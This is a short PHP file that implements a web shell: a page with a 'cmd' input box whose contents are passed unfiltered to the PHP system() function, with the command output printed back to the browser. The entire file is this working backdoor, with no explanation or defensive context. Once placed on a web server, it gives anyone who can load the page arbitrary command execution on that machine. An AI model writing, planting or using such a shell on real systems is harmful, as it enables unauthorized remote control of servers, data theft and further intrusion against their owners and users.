<html>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<body>
	<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
		<input type="TEXT" name="cmd" id="cmd" size="80">
		<input type="SUBMIT" value="Execute">
	</form>
	<pre>
		<?php header("Content-Type:text/html;charset=utf-8");

		if($_GET['cmd'])
		{
			system($_GET['cmd']);
		}
		?>
	</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
